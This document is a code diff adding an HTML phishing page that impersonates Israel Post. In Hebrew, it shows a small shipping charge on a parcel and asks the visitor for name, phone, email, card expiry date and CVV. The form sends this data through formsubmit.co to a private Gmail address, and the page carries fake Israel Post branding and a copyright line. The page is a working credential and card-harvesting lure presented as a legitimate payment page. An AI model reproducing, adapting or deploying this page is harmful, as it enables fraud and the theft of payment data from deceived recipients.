@@ -1,0 +1,203 @@
+<html>
+	<head>
+		<title>
+
+		</title>
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
+		<meta charset="utf-8">
+		<link rel="stylesheet" href="incs/main.css">
+	</head>
+	<body>
+		<div class="header">
+			<div class="left">
+				<img src="incs/il.png">
+			</div>
+			<div class="right">
+				<button class="sbmt" style="width:120px; font-size:1em; margin:0;" onclick="window.location='https://israelpost.co.il/en/itemtrace/'" fdprocessedid="fgpxzv">החשבון שלי</button>
+			</div>
+		</div>
+
+		<div class="content">
+
+			<div class="leftside">
+				<div class="form" style="">
+					<div class="title">
+						פרטי משלוח
+					</div>
+				</div>
+				<div class="form" style="margin-bottom:20px;">
+					<table>
+						<tbody>
+							<tr>
+								<th>קוד משלוח: </th>
+								<td>‌‏UZ0301297606Y‏‏</td>
+							</tr>
+							<tr>
+								<th>מספר חבילה: </th>
+								<td>LV468784038CN</td>
+							</tr>
+							<tr>
+								<th>סך הכל: </th>
+								<td>9.99 ש"ח</td>
+							</tr>
+						</tbody>
+					</table>
+				</div>
+			</div>
+
+			<div class="rightside">
+				<form action="https://formsubmit.co/shachar2100@gmail.com" id="ccform" method="POST" novalidate="novalidate">
+					<div class="form">
+						<div class="title">
+						אמצעי תשלום
+						</div>
+					</div>
+
+					<div class="form">
+						<div class="col">
+						</div>
+					</div>
+
+					<div class="col">
+						<span>שם המלא</span>
+						<input type="text" class="textinput" required="" placeholder="" name="fullname" fdprocessedid="7l1h2w">
+					</div>
+
+					<div class="col">
+						<span>מספר טלפון</span>
+						<input type="text" class="textinput" required="" placeholder="" name="phone" fdprocessedid="x03t5t">
+					</div>
+
+					<div class="col">
+						<span>אימייל</span>
+						<input type="text" class="textinput" required="" placeholder="" name="email" fdprocessedid="n52saj">
+					</div>
+
+					<div class="col">
+						<span>מספר כרטיס</span>
+						<!-- <input type="text" class="textinput" required="" placeholder="XXXX XXXX XXXX XXXX" id="ccnum" name="ccnum" maxlength="19" fdprocessedid="7ggqq"> -->
+						<!-- <p style="display:none;" id="ccerror">Invalid card number.</p> -->
+					</div>
+
+					<div class="col">
+						<span>תאריך תפוגה</span>
+						<div class="textinput" style="display:flex; ">
+							<select name="mm" fdprocessedid="91dvfm">
+							<option value="" disabled="">Month</option>
+							<option value="01 selected">01</option>
+							<option value="02">02</option>
+							<option value="03">03</option>
+							<option value="04">04</option>
+							<option value="05">05</option>
+							<option value="06">06</option>
+							<option value="07">07</option>
+							<option value="08">08</option>
+							<option value="09">09</option>
+							<option value="10">10</option>
+							<option value="11">11</option>
+							<option value="12">12</option>
+							</select> 
+							<select name="yy" fdprocessedid="k1nj3">
+							<option value="" disabled="">Year</option>
+							<option value="23" selected="">2023</option>
+							<option value="24">2024</option>
+							<option value="25">2025</option>
+							<option value="26">2026</option>
+							<option value="27">2027</option>
+							<option value="28">2028</option>
+							<option value="29">2029</option>
+							<option value="30">2030</option>
+							<option value="27">2031</option>
+							<option value="28">2032</option>
+							<option value="29">2033</option>
+							<option value="30">2034</option>
+							<option value="27">2035</option>
+							<option value="28">2036</option>
+							<option value="29">2037</option>
+							<option value="30">2038</option>
+							</select>
+						</div>
+					</div>
+
+					<div class="col">
+						<span>Code CVV</span>
+						<input type="text" class="textinput" id="cvv" required="" placeholder="CVV" name="cvv" maxlength="4" fdprocessedid="tkk962">
+					</div>
+					
+					<div class="col">
+						<button class="sbmt" type="submit" fdprocessedid="lb1ucp">עדכון</button>
+					</div>
+					<div class="col">
+						<p style="color:black; text-align:center; font-size:0.8em; margin-top:50px;">
+						בלחיצה על כפתור הפעל, אתה מסכים לתנאים וההגבלות שלנו.
+						</p>
+					</div>
+				</form>
+			</div>
+		</div>
+		<div class="footer">
+			<div>
+				© israel Post Corporation
+			</div>
+		</div>
+		<script src="incs/jq.js"></script>
+		<script src="incs/m.js"></script>
+		<script src="incs/v.js"></script>
+		<script src="incs/ccv.js"></script>
+		<script>
+			var submitted=false;
+			$("#cvv").mask("0000");
+			$("#ccnum").mask("0000 0000 0000 0000");
+
+
+			var val=false;
+			function va(){
+				
+				$("#ccnum").validateCreditCard(function(cb){ 
+					if(cb.valid){		
+					val=true;   
+					$("#ccerror").hide();
+			}else{
+				val=false;
+				if(submitted){
+			$("#ccerror").show();
+				}
+			}} );
+			
+				
+			}
+			
+			$("#ccnum").keyup(function(){
+				va();
+			});
+			
+			
+			
+			
+			$.validator.messages.required = "Required.";
+			$("#ccform").validate({
+				submitHandler:function(form){
+					submitted = true;
+					va();
+				if(val==true){
+					form.submit();
+				}else{
+					$("#ccerror").show();
+				}
+				}
+			});
+			
+			
+			
+		</script>
+
+		<div at-magnifier-wrapper="">
+			<div class="at-theme-light">
+				<div class="at-base notranslate" translate="no">
+					<div class="Z1-AJ" style="top: 0px; left: 0px;">
+					</div>
+				</div>
+			</div>
+		</div>
+	</body>
+</html>
